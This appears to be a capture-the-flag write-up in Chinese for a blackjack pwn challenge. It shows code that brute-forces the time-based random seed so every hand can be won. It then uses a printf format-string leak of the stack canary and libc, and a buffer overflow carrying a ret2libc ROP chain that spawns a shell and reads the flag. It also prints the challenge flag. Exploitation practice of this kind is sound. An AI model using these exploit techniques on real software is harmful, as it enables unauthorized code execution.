# Jack Black Writeup

## 題目描述

You just got invited to play a completely new game, different than everything ever created. They call it Jack Black, the creators were probably big Kung Fu Panda fans. Either way, you heard that the house always wins, but maybe your ropfu can even the score

## 解題思路

1. **第一步**：

    先看整體的exploit流程：

    首先，讀名字的時候可以overflow到return address：

    ```c
    #define NAME_BUF 64

    void game_loop(void) {
        char name[NAME_BUF];

        ...

        fgets(name, 256, stdin);
    }
    ```

    但因為有canary，所以先leak canary。

    所以可以用第二個漏洞(printf)實現leak canary(這是第一次贏)：

    ```c
    printf("Processing transaction for: ");
    printf(name);
    ```

    在這邊可以直接塞format string來leak stack。

    但在達成上面的手法之前，要先讓程式每一次都可以贏，才能進到要exploit的函式。
    
    因為blackjack.c使用：

    ```c
    srand(time(NULL));
    ```

    所以可以用腳本猜出seed，讓玩家能做出最佳選擇，如果真的贏不了就輸掉進下一把。

    拿到leak之後，要再贏一次(贏第二次)並退出遊戲，送出payload。

    這樣就可以觸發ROP chain，拿到shell並取得flag。

2. **第二步**：

    寫猜seed的腳本部分。

    程式發牌的邏輯是：

    ```c
    static int draw_card(void) {
        return (rand() % 13) + 1;
    }
    ```

    因此只要知道rand()的輸出，就能知道接下來會抽到什麼牌。

    因為seed是`time(NULL)`，所以腳本可以從目前時間附近暴力搜尋seed：

    ```python
    now = int(time.time())
    window = int(args.WINDOW or 300)

    for seed in range(now - window, now + window + 1):
        seq = card_sequence(seed)

        if [pcard_name(seq[0]), pcard_name(seq[1]), pcard_name(seq[2])] == visible:
            log.info(f'seed = {seed}')
            return seed, seq, 0
    ```

    找到seed之後，就能產生完整的牌序。

    腳本接著會模擬玩家hit/stand，以及莊家補牌的結果：

    ```python
    def simulate_hand(seq, idx, hits):
        player = [seq[idx], seq[idx + 2]]
        dealer = [seq[idx + 1], seq[idx + 3]]

        ...
    ```

    然後嘗試不同hit次數，找出可以贏的選擇(如果贏不了就開下一把)：

    ```python
    def choose_winning_action(seq, idx):
        for desired_hits in range(10):
            won, new_idx, actual_hits = simulate_hand(seq, idx, desired_hits)

            if won:
                return actual_hits, new_idx

        # if can't win then lose lol
        _, new_idx, actual_hits = simulate_hand(seq, idx, 0)

        return actual_hits, new_idx
    ```

    通過這個腳本，就能保證程式每次都能贏，可以順利進到下一步(送payload)。
    
3. **第三步**：

    第一次贏牌後，程式會進入：

    ```text
    Enter your name for the transaction record:
    ```

    正常寫法應該是printf("%s", name)，但程式寫成printf(name)，所以name會被當成format string解析。

    這時利用format string leak canary和libc address，腳本寫成：

    ```python
    io.sendline(f'%41$p.%43$p'.encode())
    ```

    就是：

    ```python
    io.sendline(f'%{FMT_CANARY}$p.%{FMT_LIBC_RET}$p'.encode())
    ```

    `%41$p`會leak stack canary，`%43$p`會leak一個libc相關的return address。

    拿到libc leak後，就可以計算libc base：

    ```python
    libc.address = libc_leak - libc_ret
    ```

    拿到libc base之後，就可以找到：

    ```text
    system()
    exit()
    "/bin/sh"
    pop rdi ; ret
    ```

    這些ROP chain需要的位址。

4. **第四步**：

    leak完canary和libc之後，需要再贏一次，重新進入name prompt。

    這次要把整個overflow payload送出去：

    ```python
    payload = flat(
        b'A' * 72,
        canary,
        b'A' * 8,
        ret,
        pop_rdi,
        bin_sh,
        libc.sym['system'],
        libc.sym['exit'],
    )
    ```

    從name buffer開始，到canary前面需要填72bytes。

    因為有stack canary，所以payload中間必須放回剛剛leak出來的正確canary；否則函式return前檢查canary時，程式會直接crash。

    整個payload的結構：

    ```text
    A * 72
    canary
    saved rbp
    ret
    pop rdi ; ret
    "/bin/sh"
    system
    exit
    ```

    ROP chain的目標是執行：

    ```c
    system("/bin/sh");
    ```

    送完payload後，程式還在`game_loop()`裡，會詢問：

    ```text
    Play another hand? [y/n]:
    ```

    此時輸入n，讓`game_loop()`結束並return。

    函式return後，就會使用被我們覆蓋的return address，開始執行ROP chain。

    拿到shell後，腳本會自動送出：

    ```bash
    cat flag* 2>/dev/null || cat /home/*/flag* 2>/dev/null || /bin/sh
    ```

    就可以拿到flag了。

## Flag

```text
dalctf{w3r3_y0u_c0unt1ng_c4rd5?}
```
